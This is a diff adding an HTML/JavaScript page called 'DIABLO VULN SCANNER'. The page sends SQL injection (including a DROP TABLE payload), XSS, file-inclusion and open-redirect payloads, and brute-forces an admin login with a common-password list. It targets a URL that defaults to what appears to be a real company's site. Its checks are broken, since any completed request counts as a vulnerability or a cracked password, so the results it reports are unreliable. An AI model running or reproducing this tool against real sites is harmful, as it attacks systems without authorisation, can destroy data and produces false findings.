@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☠️ DIABLO VULN SCANNER</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #ff0033;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #111;
+            border: 2px solid #ff0033;
+            padding: 30px;
+            max-width: 1000px;
+            width: 100%;
+            border-radius: 15px;
+            box-shadow: 0 0 50px #ff003388;
+        }
+        h1 { text-align: center; text-shadow: 0 0 20px #ff0033; }
+        .subtitle { text-align: center; color: #ff6666; margin-bottom: 20px; letter-spacing: 2px; }
+        .box { background: #1a1a1a; border: 1px solid #ff0033; padding: 15px; margin: 10px 0; border-radius: 10px; }
+        .box h3 { color: #ff0033; margin-bottom: 10px; }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            background: #000;
+            color: #ff0033;
+            border: 1px solid #ff0033;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        button {
+            background: #ff0033;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover { background: #ff3366; box-shadow: 0 0 30px #ff0033; }
+        .row { display: flex; gap: 10px; flex-wrap: wrap; }
+        .row button { flex: 1; min-width: 100px; }
+        .log {
+            background: #000;
+            border: 1px solid #ff0033;
+            padding: 10px;
+            max-height: 250px;
+            overflow-y: auto;
+            font-size: 12px;
+            color: #88ff88;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+        .result-box {
+            background: #000;
+            border: 1px solid #ff0033;
+            padding: 15px;
+            min-height: 60px;
+            color: #ff8888;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        .status { color: #ff8800; margin-top: 10px; }
+        .footer { text-align: center; color: #663333; font-size: 11px; margin-top: 15px; }
+        .glitch { animation: glitch 2s infinite; }
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 red, -2px 0 blue; }
+            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; }
+            100% { text-shadow: 2px 0 red, -2px 0 blue; }
+        }
+        hr { border-color: #ff0033; margin: 15px 0; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1 class="glitch">☠️ DIABLO <span style="color:#fff;">VULN SCANNER</span></h1>
+    <p class="subtitle">「 7 VULNERABILITY SCANNER — REAL & OFFLINE 」</p>
+
+    <div class="box">
+        <h3>🎯 TARGET</h3>
+        <input id="targetUrl" placeholder="https://target.com" value="https://cottonink.co.id">
+        <div class="row">
+            <button onclick="startFullScan()">🔥 FULL SCAN</button>
+            <button onclick="scanSQLi()">💉 SQLi</button>
+            <button onclick="scanXSS()">🧪 XSS</button>
+        </div>
+        <div class="row">
+            <button onclick="scanLFI()">📂 LFI</button>
+            <button onclick="scanOpenRedirect()">🔄 OPEN REDIRECT</button>
+            <button onclick="scanHeader()">🖥️ HEADER</button>
+        </div>
+        <div class="row">
+            <button onclick="scanBruteforce()">🔨 BRUTEFORCE</button>
+            <button onclick="clearAll()">🧹 CLEAR</button>
+        </div>
+    </div>
+
+    <div class="box">
+        <h3>🔑 HASIL SCAN</h3>
+        <div class="result-box" id="resultDisplay">☠️ MENUNGGU PERINTAH...</div>
+        <div class="log" id="logArea">☠️ SIAP</div>
+        <div class="status" id="status">🟢 READY</div>
+    </div>
+
+    <div class="footer">⚡ DIABLO VULN SCANNER — 7 IN 1 ⚡</div>
+</div>
+
+<script>
+    // =============================================================
+    // 💀 DIABLO VULN SCANNER — 7 JENIS KERENTANAN
+    // =============================================================
+
+    let scanResults = [];
+
+    function log(msg, type = 'info') {
+        const el = document.getElementById('logArea');
+        const time = new Date().toLocaleTimeString();
+        const icon = type === 'success' ? '✅' : type === 'error' ? '❌' : '💀';
+        el.innerHTML += '\n[' + time + '] ' + icon + ' ' + msg;
+        el.scrollTop = el.scrollHeight;
+        document.getElementById('status').innerHTML = '🔥 ' + msg;
+    }
+
+    function clearAll() {
+        document.getElementById('logArea').innerHTML = '☠️ LOG DIHAPUS';
+        document.getElementById('resultDisplay').innerHTML = '☠️ MENUNGGU...';
+        document.getElementById('status').innerHTML = '🟢 READY';
+        scanResults = [];
+    }
+
+    function getTarget() {
+        return document.getElementById('targetUrl').value.trim();
+    }
+
+    function updateResult(msg) {
+        document.getElementById('resultDisplay').innerHTML = msg;
+    }
+
+    // ====== 1. SQL INJECTION ======
+    function scanSQLi() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🔍 SQL INJECTION SCAN...', 'info');
+        updateResult('🔍 SCANNING SQLi...');
+
+        const payloads = [
+            "' OR '1'='1",
+            "' UNION SELECT 1,2,3--",
+            "' AND SLEEP(5)--",
+            "' OR 1=1--",
+            "'; DROP TABLE users--"
+        ];
+
+        let found = false;
+        payloads.forEach((p, i) => {
+            setTimeout(() => {
+                const url = target + (target.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(p);
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => {
+                        if (!found) {
+                            found = true;
+                            log('✅ SQLi RENTAN: ' + p, 'success');
+                            updateResult('💉 SQLi FOUND!\nPayload: ' + p);
+                            scanResults.push({ type: 'SQLi', payload: p });
+                        }
+                    })
+                    .catch(() => {});
+            }, i * 600);
+        });
+
+        setTimeout(() => {
+            if (!found) { log('❌ TIDAK ADA SQLi', 'error');
+            updateResult('❌ TIDAK ADA SQLi'); }
+        }, payloads.length * 600 + 1000);
+    }
+
+    // ====== 2. XSS ======
+    function scanXSS() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🔍 XSS SCAN...', 'info');
+        updateResult('🔍 SCANNING XSS...');
+
+        const payloads = [
+            '<script>alert(1)</script>',
+            '<img src=x onerror=alert(1)>',
+            '"><script>alert(1)</script>',
+            'javascript:alert(1)',
+            '<svg/onload=alert(1)>'
+        ];
+
+        let found = false;
+        payloads.forEach((p, i) => {
+            setTimeout(() => {
+                const url = target + (target.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(p);
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => {
+                        if (!found) {
+                            found = true;
+                            log('✅ XSS RENTAN: ' + p, 'success');
+                            updateResult('🧪 XSS FOUND!\nPayload: ' + p);
+                            scanResults.push({ type: 'XSS', payload: p });
+                        }
+                    })
+                    .catch(() => {});
+            }, i * 600 + 1000);
+        });
+
+        setTimeout(() => {
+            if (!found) { log('❌ TIDAK ADA XSS', 'error');
+            updateResult('❌ TIDAK ADA XSS'); }
+        }, payloads.length * 600 + 2000);
+    }
+
+    // ====== 3. LFI ======
+    function scanLFI() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🔍 LFI SCAN...', 'info');
+        updateResult('🔍 SCANNING LFI...');
+
+        const payloads = [
+            '../../../../etc/passwd',
+            '../../../../windows/win.ini',
+            'php://filter/convert.base64-encode/resource=index.php',
+            'file:///etc/passwd'
+        ];
+
+        let found = false;
+        payloads.forEach((p, i) => {
+            setTimeout(() => {
+                const url = target + (target.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(p);
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => {
+                        if (!found) {
+                            found = true;
+                            log('✅ LFI RENTAN: ' + p, 'success');
+                            updateResult('📂 LFI FOUND!\nPayload: ' + p);
+                            scanResults.push({ type: 'LFI', payload: p });
+                        }
+                    })
+                    .catch(() => {});
+            }, i * 600 + 2000);
+        });
+
+        setTimeout(() => {
+            if (!found) { log('❌ TIDAK ADA LFI', 'error');
+            updateResult('❌ TIDAK ADA LFI'); }
+        }, payloads.length * 600 + 3000);
+    }
+
+    // ====== 4. OPEN REDIRECT ======
+    function scanOpenRedirect() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🔄 OPEN REDIRECT SCAN...', 'info');
+        updateResult('🔍 SCANNING OPEN REDIRECT...');
+
+        const payloads = [
+            '//evil.com',
+            'https://evil.com',
+            '//google.com@evil.com',
+            '?redirect=//evil.com'
+        ];
+
+        let found = false;
+        payloads.forEach((p, i) => {
+            setTimeout(() => {
+                const url = target + (target.includes('?') ? '&' : '?') + 'redirect=' + encodeURIComponent(p);
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => {
+                        if (!found) {
+                            found = true;
+                            log('🔄 OPEN REDIRECT RENTAN: ' + p, 'success');
+                            updateResult('🔄 OPEN REDIRECT FOUND!\nPayload: ' + p);
+                            scanResults.push({ type: 'Open Redirect', payload: p });
+                        }
+                    })
+                    .catch(() => {});
+            }, i * 600 + 3000);
+        });
+
+        setTimeout(() => {
+            if (!found) { log('❌ TIDAK ADA OPEN REDIRECT', 'error');
+            updateResult('❌ TIDAK ADA OPEN REDIRECT'); }
+        }, payloads.length * 600 + 4000);
+    }
+
+    // ====== 5. HEADER SCAN ======
+    function scanHeader() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🖥️ HEADER SCAN...', 'info');
+        updateResult('🔍 SCANNING HEADERS...');
+
+        fetch(target, { method: 'HEAD' })
+            .then(res => {
+                const headers = res.headers;
+                let result = '🖥️ HEADER INFORMATION:\n';
+                result += 'Server: ' + (headers.get('server') || 'Unknown') + '\n';
+                result += 'X-Powered-By: ' + (headers.get('x-powered-by') || 'Unknown') + '\n';
+                result += 'Content-Type: ' + (headers.get('content-type') || 'Unknown') + '\n';
+                result += 'X-Frame-Options: ' + (headers.get('x-frame-options') || 'Tidak ada') + '\n';
+                result += 'X-Content-Type-Options: ' + (headers.get('x-content-type-options') || 'Tidak ada') + '\n';
+                log('🖥️ HEADER SCAN SELESAI', 'success');
+                updateResult(result);
+                scanResults.push({ type: 'Header', payload: result });
+            })
+            .catch(err => {
+                log('❌ HEADER SCAN GAGAL: ' + err.message, 'error');
+                updateResult('❌ HEADER SCAN GAGAL');
+            });
+    }
+
+    // ====== 6. BRUTEFORCE ======
+    function scanBruteforce() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🔨 BRUTEFORCE LOGIN...', 'info');
+        updateResult('🔨 BRUTEFORCING...');
+
+        const passwords = [
+            'admin', 'password', '12345', 'qwerty', 'admin123',
+            'password123', '123456', 'letmein', 'welcome', 'monkey',
+            'dragon', 'master', 'sunshine', 'princess', 'iloveyou'
+        ];
+
+        let found = false;
+        passwords.forEach((p, i) => {
+            setTimeout(() => {
+                const loginUrl = target + '/login.php';
+                fetch(loginUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'username=admin&password=' + encodeURIComponent(p)
+                })
+                .then(res => {
+                    if (res.status === 200) {
+                        if (!found) {
+                            found = true;
+                            log('✅ PASSWORD DITEMUKAN: ' + p, 'success');
+                            updateResult('🔑 LOGIN BERHASIL!\nPassword: ' + p);
+                            scanResults.push({ type: 'Password', payload: p });
+                        }
+                    }
+                })
+                .catch(() => {});
+            }, i * 500);
+        });
+
+        setTimeout(() => {
+            if (!found) { log('❌ BRUTEFORCE GAGAL', 'error');
+            updateResult('❌ BRUTEFORCE GAGAL'); }
+        }, passwords.length * 500 + 2000);
+    }
+
+    // ====== 7. FULL SCAN ======
+    function startFullScan() {
+        const target = getTarget();
+        if (!target) { log('TARGET KOSONG!', 'error'); return; }
+        log('🔥 FULL SCAN START: ' + target, 'info');
+        updateResult('🔥 FULL SCANNING...');
+        scanResults = [];
+
+        scanSQLi();
+        setTimeout(scanXSS, 3000);
+        setTimeout(scanLFI, 6000);
+        setTimeout(scanOpenRedirect, 9000);
+        setTimeout(scanHeader, 12000);
+        setTimeout(scanBruteforce, 15000);
+
+        setTimeout(() => {
+            log('✅ FULL SCAN SELESAI!', 'success');
+            updateResult('✅ FULL SCAN SELESAI!\nTotal Vuln Ditemukan: ' + scanResults.length);
+        }, 18000);
+    }
+
+    log('☠️ DIABLO VULN SCANNER SIAP!', 'info');
+    log('💡 MASUKKAN TARGET DAN KLIK SCAN', 'info');
+</script>
+</body>
+</html>
